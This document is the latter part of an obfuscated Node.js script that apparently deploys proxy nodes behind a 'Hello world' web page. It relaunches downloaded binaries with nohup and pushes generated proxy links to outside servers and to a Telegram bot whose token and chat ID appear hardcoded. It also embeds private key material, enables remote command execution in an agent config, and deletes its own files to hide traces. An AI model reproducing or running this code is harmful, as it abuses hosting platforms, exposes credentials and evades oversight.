            else {
                (console[_0x1c20ce(0x192)](_0x1c20ce(0x116)),
                    fs[_0x1c20ce(0xfe)](
                        path[_0x1c20ce(0x1da)](FILE_PATH, "boot.log"),
                    ));
                async function _0x54a27f() {
                    const _0x57f16a = _0x1c20ce;
                    try {
                        process[_0x57f16a(0x172)] === _0x57f16a(0x133)
                            ? await exec(
                                  "taskkill\x20/f\x20/im\x20" +
                                      botName +
                                      _0x57f16a(0x161),
                              )
                            : await exec(
                                  _0x57f16a(0x1ec) +
                                      botName[_0x57f16a(0x105)](0x0) +
                                      "]" +
                                      botName["substring"](0x1) +
                                      _0x57f16a(0x17a),
                              );
                    } catch (_0x4e1569) {}
                }
                (_0x54a27f(),
                    await new Promise((_0x5c6da0) =>
                        setTimeout(_0x5c6da0, 0xbb8),
                    ));
                const _0x449693 =
                    _0x1c20ce(0x182) +
                    path["resolve"](bootLogPath) +
                    _0x1c20ce(0x179) +
                    ARGO_PORT;
                try {
                    (await exec(
                        "nohup\x20\x22" +
                            path["resolve"](botPath) +
                            "\x22\x20" +
                            _0x449693 +
                            _0x1c20ce(0xff),
                    ),
                        console[_0x1c20ce(0x192)](botName + _0x1c20ce(0x178)),
                        await new Promise((_0x236cea) =>
                            setTimeout(_0x236cea, 0x1770),
                        ),
                        await extractDomains());
                } catch (_0x2a8202) {
                    console[_0x1c20ce(0x1fe)](_0x1c20ce(0x17c) + _0x2a8202);
                }
            }
        } catch (_0x3f6684) {
            console["error"]("Error\x20reading\x20boot.log:", _0x3f6684);
        }
}
async function getMetaInfo() {
    const _0x3cbc53 = _0x31202f;
    try {
        const _0x50d65c = await axios[_0x3cbc53(0x1f5)](_0x3cbc53(0x1e5), {
            headers: { "User-Agent": _0x3cbc53(0x1ee), timeout: 0xbb8 },
        });
        if (
            _0x50d65c[_0x3cbc53(0x129)] &&
            _0x50d65c[_0x3cbc53(0x129)]["country_code"] &&
            _0x50d65c["data"][_0x3cbc53(0x13d)]
        )
            return (_0x50d65c[_0x3cbc53(0x129)]["country_code"] +
                "-" +
                _0x50d65c[_0x3cbc53(0x129)][_0x3cbc53(0x13d)])[
                _0x3cbc53(0x1ed)
            ](/\s+/g, "_");
    } catch (_0x120832) {
        try {
            const _0x4044b9 = await axios[_0x3cbc53(0x1f5)](_0x3cbc53(0x1fd), {
                headers: { "User-Agent": _0x3cbc53(0x1ee), timeout: 0xbb8 },
            });
            if (
                _0x4044b9[_0x3cbc53(0x129)] &&
                _0x4044b9[_0x3cbc53(0x129)][_0x3cbc53(0x1f0)] === "success" &&
                _0x4044b9[_0x3cbc53(0x129)][_0x3cbc53(0x169)] &&
                _0x4044b9[_0x3cbc53(0x129)][_0x3cbc53(0x201)]
            )
                return (_0x4044b9[_0x3cbc53(0x129)][_0x3cbc53(0x169)] +
                    "-" +
                    _0x4044b9[_0x3cbc53(0x129)][_0x3cbc53(0x201)])[
                    _0x3cbc53(0x1ed)
                ](/\s+/g, "_");
        } catch (_0x3e7c61) {}
    }
    return "Unknown";
}
async function getServerIP() {
    const _0xb9284d = _0x31202f;
    let _0x34fdf9 = "";
    try {
        const _0x1db0c4 = await axios["get"](_0xb9284d(0x109), {
            timeout: 0xbb8,
        });
        _0x34fdf9 = _0x1db0c4[_0xb9284d(0x129)]["trim"]();
    } catch (_0x38cb52) {
        try {
            _0x34fdf9 = execSync(_0xb9284d(0x1c0))
                [_0xb9284d(0x1b2)]()
                [_0xb9284d(0x1e8)]();
        } catch (_0x7a0cf1) {
            try {
                const _0x1b5296 = await axios[_0xb9284d(0x1f5)](
                    _0xb9284d(0x16f),
                    { timeout: 0xbb8 },
                );
                _0x34fdf9 =
                    "[" + _0x1b5296[_0xb9284d(0x129)][_0xb9284d(0x1e8)]() + "]";
            } catch (_0x5e5eeb) {
                try {
                    _0x34fdf9 =
                        "[" +
                        execSync("curl\x20-sm\x203\x20ipv6.ip.sb")
                            ["toString"]()
                            [_0xb9284d(0x1e8)]() +
                        "]";
                } catch (_0x2b2f31) {
                    console[_0xb9284d(0x1fe)](
                        _0xb9284d(0x1e4),
                        _0x2b2f31[_0xb9284d(0x125)],
                    );
                }
            }
        }
    }
    return _0x34fdf9;
}
async function generateLinks(_0x16343e) {
    const _0x2838e4 = await getMetaInfo(),
        _0x3711fb = NAME ? NAME + "-" + _0x2838e4 : _0x2838e4,
        _0x472ee7 = await getServerIP();
    return new Promise((_0xcc1bb5) => {
        setTimeout(() => {
            const _0x3b5e9d = _0x5539,
                _0x402d3b = {
                    v: "2",
                    ps: "" + _0x3711fb,
                    add: CFIP,
                    port: CFPORT,
                    id: UUID,
                    aid: "0",
                    scy: _0x3b5e9d(0x13f),
                    net: "ws",
                    type: _0x3b5e9d(0x101),
                    host: _0x16343e,
                    path: _0x3b5e9d(0x175),
                    tls: _0x3b5e9d(0x1c7),
                    sni: _0x16343e,
                    alpn: "",
                    fp: _0x3b5e9d(0x177),
                };
            let _0x4977e1 =
                _0x3b5e9d(0x181) +
                UUID +
                "@" +
                CFIP +
                ":" +
                CFPORT +
                _0x3b5e9d(0x10a) +
                _0x16343e +
                _0x3b5e9d(0x1b5) +
                _0x16343e +
                _0x3b5e9d(0x1c1) +
                _0x3711fb +
                "\x0a\x0avmess://" +
                Buffer[_0x3b5e9d(0x148)](JSON[_0x3b5e9d(0x1eb)](_0x402d3b))[
                    _0x3b5e9d(0x1b2)
                ](_0x3b5e9d(0x118)) +
                "\x0a\x0atrojan://" +
                UUID +
                "@" +
                CFIP +
                ":" +
                CFPORT +
                _0x3b5e9d(0x1cc) +
                _0x16343e +
                "&fp=firefox&type=ws&host=" +
                _0x16343e +
                _0x3b5e9d(0x204) +
                _0x3711fb +
                _0x3b5e9d(0xfd);
            if (isValidPort(HY2_PORT)) {
                const _0x2e6ae6 = getCertificateFingerprint(certPath),
                    _0x362563 = _0x2e6ae6
                        ? _0x3b5e9d(0x170) + encodeURIComponent(_0x2e6ae6)
                        : "",
                    _0x6ef075 =
                        _0x3b5e9d(0x193) +
                        UUID +
                        "@" +
                        _0x472ee7 +
                        ":" +
                        HY2_PORT +
                        _0x3b5e9d(0x11d) +
                        _0x362563 +
                        "#" +
                        _0x3711fb;
                _0x4977e1 += _0x6ef075;
            }
            if (isValidPort(REALITY_PORT)) {
                const _0x11137e =
                    "\x0avless://" +
                    UUID +
                    "@" +
                    _0x472ee7 +
                    ":" +
                    REALITY_PORT +
                    _0x3b5e9d(0x158) +
                    publicKey +
                    _0x3b5e9d(0x151) +
                    _0x3711fb;
                _0x4977e1 += _0x11137e;
            }
            if (isValidPort(S5_PORT)) {
                const _0x12af39 = Buffer[_0x3b5e9d(0x148)](
                        UUID["substring"](0x0, 0x8) +
                            ":" +
                            UUID[_0x3b5e9d(0x150)](-0xc),
                    )[_0x3b5e9d(0x1b2)](_0x3b5e9d(0x118)),
                    _0x3203ab =
                        _0x3b5e9d(0x180) +
                        _0x12af39 +
                        "@" +
                        _0x472ee7 +
                        ":" +
                        S5_PORT +
                        "#" +
                        _0x3711fb;
                _0x4977e1 += _0x3203ab;
            }
            (console[_0x3b5e9d(0x192)](
                Buffer[_0x3b5e9d(0x148)](_0x4977e1)["toString"](
                    _0x3b5e9d(0x118),
                ),
            ),
                fs[_0x3b5e9d(0x1ac)](
                    subPath,
                    Buffer[_0x3b5e9d(0x148)](_0x4977e1)[_0x3b5e9d(0x1b2)](
                        _0x3b5e9d(0x118),
                    ),
                ),
                fs["writeFileSync"](listPath, _0x4977e1, _0x3b5e9d(0x1c3)),
                console[_0x3b5e9d(0x192)](
                    FILE_PATH + "/sub.txt\x20saved\x20successfully",
                ),
                (subContent = Buffer[_0x3b5e9d(0x148)](_0x4977e1)[
                    _0x3b5e9d(0x1b2)
                ](_0x3b5e9d(0x118))),
                uploadNodes(),
                _0xcc1bb5(_0x4977e1));
        }, 0x7d0);
    });
}
async function uploadNodes() {
    const _0x27d25c = _0x31202f;
    if (UPLOAD_URL && PROJECT_URL) {
        const _0x52e028 = PROJECT_URL + "/" + SUB_PATH,
            _0x534d3e = { subscription: [_0x52e028] };
        try {
            const _0xc48433 = await axios[_0x27d25c(0x1bd)](
                UPLOAD_URL + _0x27d25c(0x10e),
                _0x534d3e,
                { headers: { "Content-Type": _0x27d25c(0x14c) } },
            );
            return _0xc48433 && _0xc48433[_0x27d25c(0x1f0)] === 0xc8
                ? (console[_0x27d25c(0x192)](_0x27d25c(0x108)), _0xc48433)
                : null;
        } catch (_0x1af233) {
            if (_0x1af233["response"]) {
                if (_0x1af233[_0x27d25c(0x1f8)][_0x27d25c(0x1f0)] === 0x190) {
                }
            }
        }
    } else {
        if (UPLOAD_URL) {
            if (!fs["existsSync"](listPath)) return;
            const _0x55f5df = fs[_0x27d25c(0x16d)](listPath, _0x27d25c(0x117)),
                _0x4c6a44 = _0x55f5df[_0x27d25c(0x1cf)]("\x0a")[
                    _0x27d25c(0x1a8)
                ]((_0x264ddc) =>
                    /(vless|vmess|trojan|hysteria2|socks):\/\//[
                        _0x27d25c(0x1a6)
                    ](_0x264ddc),
                );
            if (_0x4c6a44[_0x27d25c(0x1d9)] === 0x0) return;
            const _0xe35602 = JSON[_0x27d25c(0x1eb)]({ nodes: _0x4c6a44 });
            try {
                const _0x327ffb = await axios[_0x27d25c(0x1bd)](
                    UPLOAD_URL + _0x27d25c(0x1a9),
                    _0xe35602,
                    { headers: { "Content-Type": _0x27d25c(0x14c) } },
                );
                return _0x327ffb && _0x327ffb[_0x27d25c(0x1f0)] === 0xc8
                    ? (console[_0x27d25c(0x192)](_0x27d25c(0x1a1)), _0x327ffb)
                    : null;
            } catch (_0x27f899) {
                return null;
            }
        } else return;
    }
}
function cleanFiles() {
    setTimeout(() => {
        const _0x4a0522 = _0x5539,
            _0x216a8b = [
                bootLogPath,
                configPath,
                webPath,
                botPath,
                listPath,
                certPath,
                keyPath,
            ];
        if (NEZHA_PORT) _0x216a8b["push"](npmPath);
        else NEZHA_SERVER && NEZHA_KEY && _0x216a8b[_0x4a0522(0x1bf)](phpPath);
        process["platform"] === "win32"
            ? exec(
                  _0x4a0522(0x15a) +
                      _0x216a8b[_0x4a0522(0x1da)]("\x20") +
                      _0x4a0522(0x110),
                  (_0x23ffff) => {
                      const _0x3932c3 = _0x4a0522;
                      (console["clear"](),
                          alwaysLog(_0x3932c3(0x187)),
                          console["log"](_0x3932c3(0x157)));
                  },
              )
            : exec(
                  "rm\x20-rf\x20" +
                      _0x216a8b[_0x4a0522(0x1da)]("\x20") +
                      "\x20>/dev/null\x202>&1",
                  (_0x54098f) => {
                      const _0x1a5c64 = _0x4a0522;
                      (console[_0x1a5c64(0x1e2)](),
                          alwaysLog(_0x1a5c64(0x187)),
                          console[_0x1a5c64(0x192)](_0x1a5c64(0x157)));
                  },
              );
    }, 0x15f90);
}
cleanFiles();
async function sendTelegram() {
    const _0x332696 = _0x31202f;
    if (!BOT_TOKEN || !CHAT_ID) {
        console["log"](_0x332696(0x1de));
        return;
    }
    try {
        const _0x49ed10 = fs["readFileSync"](subPath, _0x332696(0x1c3)),
            _0x277330 = _0x332696(0x171) + BOT_TOKEN + "/sendMessage",
            _0x3f91ff = NAME[_0x332696(0x1ed)](
                /[_*\[\]()~`>#+=|{}.!-]/g,
                _0x332696(0x15f),
            ),
            _0x25de3f = {
                chat_id: CHAT_ID,
                text:
                    "**" +
                    _0x3f91ff +
                    _0x332696(0x200) +
                    _0x49ed10 +
                    _0x332696(0x11e),
                parse_mode: "MarkdownV2",
            };
        (await axios["post"](_0x277330, null, { params: _0x25de3f }),
            console[_0x332696(0x192)](_0x332696(0x174)));
    } catch (_0x27829f) {
        console["error"](_0x332696(0x1d1), _0x27829f["message"]);
    }
}
function _0xa9b2() {
    const _0x192b5f = [
        "der",
        "reality",
        "1150920GOdJhf",
        "/config.yaml\x22\x20>/dev/null\x202>&1\x20&",
        "\x0a\x20\x20\x20\x20",
        "unlinkSync",
        "\x20>/dev/null\x202>&1\x20&",
        ".download",
        "none",
        "\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20",
        "vless",
        "web\x20running\x20error:\x20",
        "charAt",
        "www.iij.ad.jp:443",
        "openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22",
        "Subscription\x20uploaded\x20successfully",
        "http://ipv4.ip.sb",
        "?encryption=none&security=tls&sni=",
        "/bot",
        "8443",
        "renameSync",
        "/api/add-subscriptions",
        "\x20-c\x20",
        "\x20>\x20nul\x202>&1",
        "createWriteStream",
        "forEach",
        "generateKeyPairSync",
        "boot.log",
        "pipe",
        "ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain",
        "utf-8",
        "base64",
        "arm",
        "digest",
        "publicKey",
        "www.iij.ad.jp",
        "/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none",
        "```",
        "BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a",
        "8169961056:AAGxsur-cAeC8PuCm7ehJUygfBeVAcgeiJY",
        "trojan-ws-in",
        "Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!",
        "ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels",
        "-----BEGIN\x20CERTIFICATE-----\x0a",
        "message",
        "\x22\x20run",
        "2087",
        "--tls",
        "data",
        "text/html;\x20charset=utf-8",
        "\x22\x20-subj\x20\x22/CN=bing.com\x22",
        "PrivateKey:\x20",
        "vless-in",
        "\x20in\x20clouudflare",
        "inbounds",
        "2053",
        "ignore",
        "dirname",
        "win32",
        "tcp",
        "s5-in",
        "Failed\x20to\x20calculate\x20certificate\x20fingerprint:",
        "has",
        "pop",
        "\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&",
        "mkdirSync",
        "Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a",
        "raw",
        "isp",
        "fileUrls",
        "auto",
        "\x20-p\x20",
        "\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20",
        "/web",
        "stream",
        "\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20",
        "A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a",
        "floor",
        "2096",
        "from",
        "then",
        "/trojan-argo",
        "https://amd64.ssss.nyc.mn",
        "application/json",
        "npm\x20running\x20error:\x20",
        "\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20",
        "freedom",
        "slice",
        "&type=tcp&headerType=none#",
        "-----END\x20EC\x20PARAMETERS-----\x0a",
        "arm64",
        "Skipping\x20adding\x20automatic\x20access\x20task",
        "resolve",
        "Add\x20automatic\x20access\x20task\x20faild:\x20",
        "Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!",
        "?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=",
        "1739232KAThVF",
        "del\x20/f\x20/q\x20",
        "tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20",
        "AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a",
        "Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.",
        "existsSync",
        "\x5c$&",
        "password",
        ".exe\x20>\x20nul\x202>&1",
        "https://arm64.ssss.nyc.mn",
        "openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22",
        "finish",
        "hex",
        "/vless-argo",
        "proxy",
        "openssl\x20version",
        "countryCode",
        "map",
        "createHash",
        "chmodSync",
        "readFileSync",
        "sub.txt",
        "http://ipv6.ip.sb",
        "&pinSHA256=",
        "https://api.telegram.org/bot",
        "platform",
        "hysteria",
        "Telegram\x20message\x20sent\x20successfully",
        "/vmess-argo?ed=2560",
        ".npm",
        "firefox",
        "\x20is\x20running",
        "\x22\x20--loglevel\x20info\x20--url\x20http://localhost:",
        "\x22\x20>\x20/dev/null\x202>&1",
        "/config.json\x20>/dev/null\x202>&1\x20&",
        "Error\x20executing\x20command:\x20",
        "\x20successfully",
        "close",
        "sub",
        "\x0asocks://",
        "\x0avless://",
        "tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22",
        "https+local://8.8.8.8/dns-query",
        "Retrying\x20",
        "text/plain;\x20charset=utf-8",
        "subarray",
        "App\x20is\x20running",
        "1213970CGAXej",
        "all",
        "aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a",
        "\x20-s\x20",
        "true",
        "TunnelSecret",
        "MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a",
        "base64url",
        "createServer",
        "vmess-ws-in",
        "log",
        "\x0ahysteria2://",
        "php\x20running\x20error:\x20",
        "Download\x20",
        "cert.pem",
        "unlink",
        "\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:",
        "listen",
        "hysteria-in",
        "fileName",
        "includes",
        "openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22",
        "stdout",
        "match",
        "Private\x20Key:",
        "Nodes\x20uploaded\x20successfully",
        "/vmess-argo",
        "vless-ws-in",
        "https://oooo.serv00.net/add-url",
        "block",
        "test",
        "trojan",
        "filter",
        "/api/add-nodes",
        "now",
        "MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a",
        "writeFileSync",
        "ArgoDomain:",
        "Public\x20Key:",
        "child_process",
        "automatic\x20access\x20task\x20added\x20successfully",
        "/api/delete-nodes",
        "toString",
        "write",
        "quic",
        "&fp=firefox&type=ws&host=",
        "Empowerment\x20failed\x20for\x20",
        "update",
        "sha256",
        "\x0a\x20\x20tunnel:\x20",
        "\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20",
        "/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a",
        "127.0.0.1",
        "post",
        "481810gagJCg",
        "push",
        "curl\x20-sm\x203\x20ipv4.ip.sb",
        "&path=%2Fvless-argo%3Fed%3D2560#",
        "www.visa.co.uk",
        "utf8",
        "vless-fallback-in",
        "basename",
        "blackhole",
        "tls",
        "toLowerCase",
        "unshift",
        "config.json",
        "privateKey",
        "?security=tls&sni=",
        "https://arm64.oooen.com",
        "http",
        "split",
        "42SRwPSw",
        "Failed\x20to\x20send\x20Telegram\x20message:",
        "Unhandled\x20error\x20in\x20startserver:",
        "\x0a\x20\x20credentials-file:\x20",
        "tunnel.json",
        "2083",
        "path",
        "spki",
        "pkcs8",
        "length",
        "join",
        "\x20failed:\x20",
        "vmess",
        "end",
        "TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG",
        "-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a",
        "1889061xRxAZh",
        "direct",
        "clear",
        "90TmXYKO",
        "Failed\x20to\x20get\x20IP\x20address:",
        "https://api.ip.sb/geoip",
        "export",
        "/v1",
        "trim",
        "writeHead",
        "Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20",
        "stringify",
        "pkill\x20-f\x20\x22[",
        "replace",
        "Mozilla/5.0",
        "-----END\x20EC\x20PRIVATE\x20KEY-----\x0a",
        "status",
        "util",
        "readdirSync",
        "false",
        "eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a",
        "get",
        "6389CByxnH",
        "isFile",
        "response",
        "tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22",
        "-----BEGIN\x20EC\x20PARAMETERS-----\x0a",
        "/dev/null",
        "catch",
        "http://ip-api.com/json",
        "error",
        "substring",
        "节点推送**\x0a```",
        "org",
        "tunnel.yml",
        "random",
        "&path=%2Ftrojan-argo%3Fed%3D2560#",
        "toUpperCase",
        "6054856QbFdDm",
        "nohup\x20",
        "Empowerment\x20success\x20for\x20",
        "arch",
        "xtls-rprx-vision",
        "private.key",
        "socks",
        "list.txt",
        "-1002824036968",
    ];
    _0xa9b2 = function () {
        return _0x192b5f;
    };
    return _0xa9b2();
}
async function AddVisitTask() {
    const _0x1f5155 = _0x31202f;
    if (!AUTO_ACCESS || !PROJECT_URL) {
        console["log"](_0x1f5155(0x154));
        return;
    }
    try {
        const _0x113257 = await axios[_0x1f5155(0x1bd)](
            _0x1f5155(0x1a4),
            { url: PROJECT_URL },
            { headers: { "Content-Type": "application/json" } },
        );
        return (console[_0x1f5155(0x192)](_0x1f5155(0x1b0)), _0x113257);
    } catch (_0x145902) {
        return (
            console["error"](_0x1f5155(0x156) + _0x145902[_0x1f5155(0x125)]),
            null
        );
    }
}
async function startserver() {
    const _0x4b6c7f = _0x31202f;
    try {
        (cleanupOldFiles(),
            argoType(),
            deleteNodes(),
            isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
            isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
            await generateConfig(),
            await downloadFilesAndRun(),
            await extractDomains(),
            await sendTelegram(),
            await AddVisitTask());
    } catch (_0x52c501) {
        console[_0x4b6c7f(0x1fe)]("Error\x20in\x20startserver:", _0x52c501);
    }
}
startserver()["catch"]((_0x26dfe4) => {
    const _0x4f45ed = _0x31202f;
    console[_0x4f45ed(0x1fe)](_0x4f45ed(0x1d2), _0x26dfe4);
});
const server = http[_0x31202f(0x190)](async (_0x3e53c3, _0x4cca9f) => {
    const _0xe628e4 = _0x31202f,
        _0x2c474d = _0x3e53c3["url"][_0xe628e4(0x1cf)]("?")[0x0];
    if (_0x2c474d === "/" + SUB_PATH) {
        if (subContent)
            (_0x4cca9f[_0xe628e4(0x1e9)](0xc8, {
                "Content-Type": _0xe628e4(0x185),
            }),
                _0x4cca9f[_0xe628e4(0x1dd)](subContent));
        else
            try {
                const _0x16fa85 = fs[_0xe628e4(0x16d)](
                    subPath,
                    _0xe628e4(0x117),
                );
                (_0x4cca9f[_0xe628e4(0x1e9)](0xc8, {
                    "Content-Type": _0xe628e4(0x185),
                }),
                    _0x4cca9f[_0xe628e4(0x1dd)](_0x16fa85));
            } catch (_0x6be755) {
                (_0x4cca9f["writeHead"](0x1f7, {
                    "Content-Type": _0xe628e4(0x185),
                }),
                    _0x4cca9f[_0xe628e4(0x1dd)](_0xe628e4(0x15d)));
            }
        return;
    }
    if (_0x2c474d === "/") {
        try {
            const _0x1612d4 = path["join"](__dirname, "index.html"),
                _0x387f68 = await fs["promises"]["readFile"](_0x1612d4, "utf8");
            (_0x4cca9f["writeHead"](0xc8, { "Content-Type": _0xe628e4(0x12a) }),
                _0x4cca9f["end"](_0x387f68));
        } catch (_0x5764d8) {
            (_0x4cca9f[_0xe628e4(0x1e9)](0xc8, {
                "Content-Type": _0xe628e4(0x12a),
            }),
                _0x4cca9f[_0xe628e4(0x1dd)](_0xe628e4(0x122)));
        }
        return;
    }
    (_0x4cca9f[_0xe628e4(0x1e9)](0x194, {
        "Content-Type": "text/plain;\x20charset=utf-8",
    }),
        _0x4cca9f["end"]("Not\x20Found"));
});
server[_0x31202f(0x199)](PORT, () =>
    alwaysLog("http\x20server\x20is\x20running\x20on\x20" + PORT + "!"),
);
